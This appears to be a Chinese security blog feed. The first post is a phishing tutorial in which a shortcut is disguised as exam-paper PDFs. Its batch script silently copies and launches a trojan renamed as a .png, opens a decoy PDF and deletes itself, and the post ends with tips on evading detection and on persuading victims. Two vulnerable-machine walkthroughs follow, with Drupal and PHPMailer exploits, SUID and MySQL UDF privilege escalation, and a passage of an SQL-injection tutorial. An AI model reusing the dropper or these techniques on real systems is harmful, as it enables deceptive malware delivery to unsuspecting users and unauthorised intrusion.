src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103627662.png" alt="image.png"><br>先指向calc.exe<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103712154.png" alt="image.png"><br>右键属性选择更改图标<br>%SystemRoot%\System32\SHELL32.dll<br>填入这个<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103804220.png" alt="image.png"><br>更改成空白图标，再做一下重命名<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103829804.png" alt="image.png"><br>拖入010<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103911849.png" alt="image.png"><br>要选择第二个打开LN<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103941652.png" alt="image.png"><br>这部分就是我们要改的内容，网上很多什么unicode修改，我不知道为什么一直出错，我后面选择了在010自带的内容里修改<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104035467.png" alt="image.png"><br>就是这里，改成.\1.pdf<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104101714.png" alt="image.png"><br>再保存<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104127939.png" alt="image.png"><br>再回去看，可以看到已经变成了一个带箭头的pdf快捷方式，然后就是找一些真的资料来骗<br>刚好正值考试季，找朋友要了下往年试卷<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104944339.png" alt="image.png"></p><p>布局一下文件夹格式</p><p>这是我想象的布局，第二个打码的是他们不用考的科目，他们应该不会打开，所以我计划在里面放🐎，<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225105244734.png" alt="image.png"><br>然后将三套离散卷子都改成触发🐎的快捷方式，这样既有一致性，无论点哪个都会触发，而且就放在根目录，应该会第一时间点开这个，至于概率论就放真的卷子好了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225105611997.png" alt="image.png"><br>然后在不用考的目录里多套几层壳，.png文件就是木马做了重命名，而且.png可以更好地规避杀毒软件的扫描，我们后续会通过bat来触发，再在这个文件夹里放入真的离散卷子<br>然后修改一下bat文件里的内容</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">chcp 65001<br>cmd <span class="hljs-string">/c</span> xcopy <span class="hljs-string">/h</span> <span class="hljs-string">/y</span> %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\<span class="hljs-string">.DS_Store.png</span> %temp%\<br>attrib -s -a -h %temp%\<span class="hljs-string">.DS_Store.png</span><br>start %temp%\<span class="hljs-string">.DS_Store.png</span><br><br>del <span class="hljs-string">&quot;《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf.lnk&quot;</span><br>copy %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf %<span class="hljs-keyword">cd</span>%\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf<br>start %<span class="hljs-keyword">cd</span>%\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf<br>del %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf<br>del %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\<span class="hljs-string">.DS_Store.png</span><br>del <span class="hljs-string">/s</span> <span class="hljs-string">/q</span> <span class="hljs-string">/f</span> %0<br></code></pre></td></tr></table></figure><p>这里先用一套试卷大致写个demo，大体意思就是，先把png传到%temp%目录下，并且执行<br>然后把快捷方式删了，再把🐎目录下真正的试卷传到原本快捷方式的目录下，并打开，从而伪造一种真实的感觉，再把马目录下的东西都删了，只留一个.DS_Store，因为MAC笔记本存文件原本就有这个</p><p>接下来就是修改快捷方式<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225110355528.png" alt="image.png"><br>如图修改，然后压缩打包<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111205892.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111234230.png" alt="image.png"><br>可以看到还是有挺多破绽的，先试试再说<br>本地测试一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111402252.png" alt="image.png"><br>okok一切顺利<br>接下来就是<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101222391.png" alt="image.png"></p><p>正当我等着他们发弹计算机截图的时候<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102041537.png" alt="image.png"><br>不是，这就被看出来了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102221704.png" alt="image.png"><br>失算了，居然是云解压，而且云解压能很清楚的看到后缀.lnk<br>当然我的好同学还是愿意继续的，不过还是各种问题<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102742675.png" alt="image.png"><br>红温了，我仔细一看，不是，怎么有人不解压直接运行啊，我还故意加了密码，就是想着他们要填密码解压<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102922843.png" alt="image.png"><br>最后，也算是成功了</p><p>总结：<br>zip的压缩方式容易失败，个人认为可以采用rar或者7z的加密文件名，这样子不解压就看不到里面的内容，可以避免一些问题，而且也要加上一些话术，让别人更容易相信，还有听说bat有一次直接报毒了，我本地没有这种情况，后续可能会再测试下vbs，还有就是试试能不能在隐藏文件夹的情况下再做调用，这样可能会更隐蔽</p><p>感谢愿意配合我的同学，<strong>最后再声明一次，请在授权情况下再做测试，本文只用于交流学习</strong></p>]]></content>
    
    
    <categories>
      
      <category>钓鱼</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>钓鱼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场-DC-1</title>
    <link href="/2024/11/11/DC-1/"/>
    <url>/2024/11/11/DC-1/</url>
    
    <content type="html"><![CDATA[<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051211935.png" alt="image.png"><br>首先快速做下全端口扫描，开了四个端口<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051211803.png" alt="image.png"><br>再做下指纹识别，80端口有一个drupal网站，再进行目录扫描<br>其中有一个<br>&#x2F;UPGRADE.txt<br>里面指出这是Drupal 7.x，那果断先找nday<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051221505.png" alt="image.png"><br>这里选择几个RCE试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051222522.png" alt="image.png"><br>msf给出的更明显，那我们直接使用<br>exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051224725.png" alt="image.png"><br>成功getshell<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051224647.png" alt="image.png"><br>接下来就是提权<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051311959.png" alt="image.png"><br>我们看到good CMS needs a config file<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051508796.png" alt="image.png"><br>上传了个马方便我可视化测试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051511428.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051513051.png" alt="image.png"><br>看到里面有数据库配置信息，但是这看着不像root权限，对我们提权好像没什么帮助，可能有flag吧，我们跟着继续看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051528236.png" alt="image.png"><br>拿到管理员账号密码，这种基本上是不可逆的，我们刚才获取数据库的地方也看到了，这是有盐的<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051530280.png" alt="image.png"><br>但我们可以通过这个盐去修改密码（生成新的密码admin）<br><code>update users set pass=&#39;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#39; where name=&#39;admin&#39;;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051533534.png" alt="image.png"><br>找到flag3<br>这个的意思是去看&#x2F;etc&#x2F;shadow<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051537296.png" alt="image.png"><br>权限不足，那还是得提权<br>常规思路，先看内核<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051538017.png" alt="image.png"><br>debian 3.2<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051539613.png" alt="image.png"><br>看起来没有<br>然后看机制滥用，suid跟sudo<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051549808.png" alt="image.png"><br>可以看到find<br><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a><br>照着套套就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051556725.png" alt="image.png"><br>提权成功<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051557872.png" alt="image.png"><br>发现还有个flag4的帐号<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051558437.png" alt="image.png"><br>拿到flag4的内容<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411051558760.png" alt="image.png"><br>都提权了，root肯定也有一个<br>完成</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场-Raven2</title>
    <link href="/2024/11/11/Raven2/"/>
    <url>/2024/11/11/Raven2/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>主机识别：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409250008074.png" alt="image.png"><br>端口扫描：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409250009019.png" alt="image.png"><br>38384这种放在高端口一般就意味着藏东西了，nmap扫下详细信息<br>22，80都很熟悉了就不看了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409250012717.png" alt="image.png"><br>嘶，说实话我还是看不懂，那只能先从80端口下手<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301255893.png" alt="image.png"><br>网页端长这样，第一反应肯定是去登录注册口，但是点了没反应，对目录进行扫描试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301258035.png" alt="image.png"><br>可以看到一个.DS_Store的泄漏，发现这可能是基于wordpress框架搭建的，并且存在登录的页面，先看看.DS_Store<br><code>dumpall -u http://192.168.56.146/.DS_Store</code><br>使用dumpall提取出文件<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301308275.png" alt="image.png"><br>这个security - Doc一看就很诱人<br>好吧啥也没有，继续看目录扫描的结果，一个个点开看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301311910.png" alt="image.png"><br>发现vendor这里直接目录就泄漏出来了，那我刚才还把DS_Store弄下来扒了一堆前端代码干嘛<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301312617.png" alt="image.png"><br>随便点点找到flag1<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301313090.png" alt="image.png"><br>简单翻阅一下发现这个系统应该是跟phpmailer有关，然后这里疑似账号密码泄漏<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301314095.png" alt="image.png"><br>有个version，我们一会儿可以根据这个找nday（其实按照靶场惯例的话这里直接可以开打了）</p><h1 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h1><p>但我们还是访问下登录的路径，打打弱口令，毕竟刚才那个flag出现的这么突然，如果这里也有呢？<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301320147.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301321482.png" alt="image.png"><br>他直接跳转到raven.local了，windows改hosts有点麻烦，这里就先跳过了，废话不多说，直接打nday<br>用上我们的搜索大法<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301343037.png" alt="image.png"><br>这种脚本还是python的比较好用，那我们就用40974.py<br>先看看脚本内容<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301351933.png" alt="image.png"><br>圈起来的三个地方改改就行<br>如下：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301352109.png" alt="image.png"><br>我这里有点错，访问about.html不知道为什么是不行的，我后面改成contact.php就成功了（后面看的时候发现漏洞点是在contact.php的，所以必须是这个）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301354658.png" alt="image.png"><br>访问一下shell所在链接即可监听<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301355635.png" alt="image.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>肯定先是完善下tty，毕竟这样子看着也不舒服，还不稳定<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>然后ctrl+z，再输入stty raw -echo<br>在输入fg回到靶机，这个时候其实跟ssh连接就没什么区别了<br><code>find / -name flag* 2&gt;/dev/null</code><br>再输入这个去找flag<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301407324.png" alt="image.png"><br>可以看到flag2跟flag3，我们直接cat一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301408749.png" alt="image.png"><br>flag3的话我们访问一下即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301409184.png" alt="image.png"><br>由于我们刚才一直有看到的wordpress，而wordpress肯定是会config文件的，我们再看看里面的内容<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301418679.png" alt="image.png"><br>直接就看到了mysql setting<br>白看了，发现提权收集信息还是脚本爽，脚本直接检查全部.conf文件，而且还发现mysql是root权限，那我们就可以从这里出发，先连上<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301441008.png" alt="image.png"><br>mysql提权一般来讲有三种<br>udf，mof，启动项<br>其中udf提权是通过手动写入函数的方式进行提权<br><code>show global variables like &#39;%secure%&#39;;</code><br>使用这个语句进行检测<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301445335.png" alt="image.png"><br>这里我们主要看secure_file_priv<br>主要分三种情况</p><ol><li>null：无法提权</li><li>具体目录，如&#x2F;tmp：无法提权</li><li>空，即如图，可以提权<br>（udf提权还要看mysql版本，这里我漏了看，这个靶场是5.5.6）<br>然后就是找网上现成提权脚本<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301452390.png" alt="image.png"><br>我们就用这个<br>-g 生成调试信息<br>-c 编译（二进制）<br>-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。<br>-o：执行命令后的文件名<br>-lc：-l 库 c库名<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301454287.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301455902.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409301457442.png" alt="image.png"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use mysql; <br>#进入数据库<br>create table foo(line blob); <br>#创建数据表foo<br>insert into foo values(load_file(&#x27;/tmp/tiquan.so&#x27;)); <br>#插入数据<br>select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/tiquan.so&#x27;; <br>#( Foo表成功插入二进制数据，<br>然后利用dumpfile函数把文件导出<br>outfile 多行导出，dumpfile一行导出<br>outfile会有特殊的转换，而dumpfile是原数据导出<br>新建存储函数)<br>create function do_system returns integer soname &#x27;icepeak.so&#x27;; <br>#(创建自定义函数do_system 类型是integer，别名<br>soname文件名字然后查询函数是否创建成功)<br>select * from mysql.func;<br>select do_system(&#x27;chmod u+s /usr/bin/find&#x27;); <br>#(调用do_system函数来给find命令所有者的suid权限，使其可以执行<br> root命令)<br>quit<br></code></pre></td></tr></table></figure>最后再执行一次找flag就结束啦</li></ol>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2024/11/11/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/11/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>mysql对大小写不敏感<br>每句话都要以;结尾</p><h3 id="基础语句总结："><a href="#基础语句总结：" class="headerlink" title="基础语句总结："></a>基础语句总结：</h3><table><thead><tr><th>语句</th><th>含义</th></tr></thead><tbody><tr><td>mysql -u&lt;用户名&gt; -p&lt;密码&gt;</td><td>连接数据库</td></tr><tr><td>show databases;</td><td>查询数据库</td></tr><tr><td>create database &lt;数据库名&gt;</td><td>创建名为&lt;数据库名&gt;的数据库</td></tr><tr><td>use &lt;数据库名&gt;；</td><td>使用名为&lt;数据库名&gt;的数据库</td></tr><tr><td>drop database &lt;数据库名&gt;</td><td>删除名为&lt;数据库名&gt;的数据库</td></tr><tr><td>create table &lt;表名&gt;(<br>&lt;列名&gt; &lt;数据类型&gt;&lt;数据最大长度&gt; &lt;其余属性&gt;,<br>&lt;列名&gt; &lt;数据类型&gt;&lt;数据最大长度&gt; &lt;其余属性&gt;,<br>……<br>);</td><td>创建一个名为&lt;表名&gt;的表，并生成有确定属性的列</td></tr><tr><td>insert into &lt;表名&gt;(&lt;列名1&gt;，&lt;列名2&gt;,…) values(‘&lt;数据&gt;’,’&lt;数据&gt;’,…);</td><td>向&lt;表名&gt;中插入数据</td></tr><tr><td>select &lt;列名&gt; from &lt;表名&gt;;</td><td>查询&lt;表名&gt;中的数据，当&lt;列名&gt;为<code>*</code>即查询整个表</td></tr><tr><td>update &lt;表名&gt; set &lt;列名&gt;&#x3D;&lt;新的数据&gt; where &lt;列名&gt;&#x3D;&lt;数据&gt;</td><td>更新数据</td></tr><tr><td>delete from &lt;表明&gt; where &lt;列名&gt;&#x3D;&lt;数据&gt;</td><td>删除数据</td></tr></tbody></table><h3 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h3><h4 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h4><p><code>mysql -uroot -p&lt;密码&gt;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311902459.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311903462.png" alt="image.png"><br>出现 mysql&gt; 即为连接成功</p><h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><p>show databases;<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311904953.png" alt="image.png"></p><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p>create database lianxi;    创建名为lianxi的数据库<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311907683.png" alt="image.png"><br>此时再查询数据库，就会看到lianxi<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311907152.png" alt="image.png"></p><h4 id="选中数据库"><a href="#选中数据库" class="headerlink" title="选中数据库"></a>选中数据库</h4><p>use lianxi;    选中数据库lianxi<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311912226.png" alt="image.png"></p><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><p>drop database lianxi;  删除数据库lianxi<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311915142.png" alt="image.png"></p><h4 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h4><p> create table biao1(                                                          &#x2F;&#x2F;创建名为biao1的表<br>    -&gt; id int(10) not null primary key auto_increment,&#x2F;&#x2F;创建一个列名为id，整数型，最大长度为10，不能为空，设定为主键（在这个表中每一个值都是唯一的，不会有重复），自增<br>    -&gt; name char(20) not null,                                      &#x2F;&#x2F;列名name，字符型，最大长度20，不为空<br>    -&gt; age int(8) not null,<br>    -&gt; sex char(20) not null<br>    -&gt; );<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311926002.png" alt="image.png"><br>其它的属性：</p><table><thead><tr><th>名字</th><th>含义</th></tr></thead><tbody><tr><td>primary key</td><td>指定表的主键</td></tr><tr><td>auto_increment</td><td>指定字段为自增字段，该字段的类型必须为int或bigint才能设置为自增字段</td></tr><tr><td>not null|null</td><td>设置字段能否取空值</td></tr><tr><td>default</td><td>设置字段的默认值</td></tr><tr><td>index</td><td>用来创建索引<br>idx_name指定索引名，该参数可以省略，如果省略则索引名就是字段名</td></tr><tr><td>foreign key</td><td>指定外键</td></tr><tr><td>engine</td><td>设置引擎类型，常用的有innoDB和myISAM引擎</td></tr><tr><td>default charset</td><td>设置表所用的字符集</td></tr></tbody></table><h4 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h4><p>show tables;                       查询表<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408311926865.png" alt="image.png"></p><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><p>插入数据以及查询<br>insert into biao1(name,age,sex) values(‘e1even’,’20’,’男’)；   &#x2F;&#x2F;插入数据<br>select * from biao1;                                                                  &#x2F;&#x2F;查询整个表<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312007847.png" alt="image.png"><br>也可以选我们想要的内容看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312010640.png" alt="image.png"></p><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>update biao1 set name&#x3D;’hex2bin_0xF’ where id&#x3D;1;<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408312020292.png" alt="image.png"></p><p>至此的基本增删改查结束</p><h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><ul><li>绕过登录验证：万能密码</li><li>获取敏感数据：查询</li><li>文件系统操作：列目录，读取写入文件</li><li>注册表操作：读取写入删除注册表等</li><li>执行系统命令：远程执行命令</li></ul><h2 id="数据库分类"><a href="#数据库分类" class="headerlink" title="数据库分类"></a>数据库分类</h2><p>MYSQL,MSSQL(sql server),oracle,PostgreSQL,access</p><h3 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-comment">//判断是否是Mysql数据库</span><br>and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> information_schema.tables)  <span class="hljs-meta">#</span><br><br><span class="hljs-comment">//判断是否是 access数据库</span><br>and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> msysobjects) <span class="hljs-meta">#</span><br><br><span class="hljs-comment">//判断是否是 Sqlserver数据库</span><br>and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> sysobjects) <span class="hljs-meta">#&#x27;</span><br><br><span class="hljs-comment">//oracle</span><br>and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> sys.user_tables)&gt;<span class="hljs-number">0</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><br><span class="hljs-comment">//postgresql</span><br>;<span class="hljs-keyword">select</span> pg_sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="对应特征"><a href="#对应特征" class="headerlink" title="对应特征"></a>对应特征</h3><h4 id="MYSQL-1"><a href="#MYSQL-1" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>mysql在5.0之后默认有一个名为information_schema的数据库，这个库里的内容都是只读的，这里有三个很重要的表</p><p>information_schema.<strong>schemata</strong>，记录所有库名</p><p>information_schema.<strong>tables</strong>，记录所有表名</p><p>information_schema.<strong>columns</strong>，记录所有列名</p><p>以下是常见函数</p><p>version():查询数据库的版本<br>user():查询数据库的使用者<br>database():数据库<br>system_user():系统用户名<br>session_user():连接数据库的用户名<br>current_user():当前用户名<br>load_file():读取本地文件<br>@@datadir:读取数据库路径<br>@@basedir:mysql安装路径<br>@@version_complie_os:查看操作系统</p><p>以下是注释符号</p><p>– -,–+,#</p><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><p><strong>系统视图</strong></p><ul><li><code>sys.databases</code>：记录所有数据库信息</li><li><code>sys.tables</code>：记录所有表名</li><li><code>sys.columns</code>：记录所有列名</li></ul><p><strong>常见函数</strong></p><ul><li><code>@@VERSION</code>：查询数据库版本</li><li><code>USER_NAME()</code>：查询当前用户</li><li><code>DB_NAME()</code>：查询当前数据库</li><li><code>SYSTEM_USER</code>：系统用户名</li><li><code>SESSION_USER</code>：会话用户名</li><li><code>OPENROWSET()</code>：读取外部数据</li></ul><p><strong>注释符号</strong></p><ul><li><code>--</code>（单行注释）</li><li><code>/* */</code>（多行注释）</li></ul><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p><strong>系统视图</strong></p><ul><li><code>ALL_TABLES</code>：记录所有可访问表</li><li><code>ALL_TAB_COLUMNS</code>：记录所有列信息</li><li><code>USER_TABLES</code>：记录当前用户的所有表</li></ul><p><strong>常见函数</strong></p><ul><li><code>USER</code>：当前用户</li><li><code>CURRENT_USER</code>：连接用户</li><li><code>SYSDATE</code>：当前日期和时间</li><li><code>VERSION</code>：数据库版本</li></ul><p><strong>注释符号</strong></p><ul><li><code>--</code>（单行注释）</li><li><code>/* */</code>（多行注释）</li></ul><h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p><strong>系统视图</strong></p><ul><li><code>pg_catalog.pg_database</code>：记录所有数据库</li><li><code>pg_catalog.pg_tables</code>：记录所有表</li><li><code>pg_catalog.pg_columns</code>：记录所有列</li></ul><p><strong>常见函数</strong></p><ul><li><code>current_database()</code>：当前数据库名</li><li><code>current_user</code>：当前用户</li><li><code>version()</code>：数据库版本</li><li><code>current_schema()</code>：当前模式</li></ul><p><strong>注释符号</strong></p><ul><li><code>--</code>（单行注释）</li><li><code>/* */</code>（多行注释）</li></ul><h4 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h4><p><strong>系统视图</strong></p><ul><li>访问数据表通过 <code>MSysObjects</code> 系统表查看数据库对象</li></ul><p><strong>常见函数</strong></p><ul><li><code>CurrentUser()</code>：当前用户</li><li><code>CurrentDb()</code>：当前数据库</li><li><code>Version()</code>：数据库版本</li></ul><p><strong>注释符号</strong></p><ul><li><code>&#39;</code>（单行注释，用于SQL语句）</li><li><code>/* */</code>（多行注释）</li></ul><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><h3 id="基于响应"><a href="#基于响应" class="headerlink" title="基于响应"></a>基于响应</h3><p>联合注入，报错注入，时间盲注，布尔盲注，堆叠注入</p><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>常规流程</p><figure class="highlight pgsql"><table><tr><td 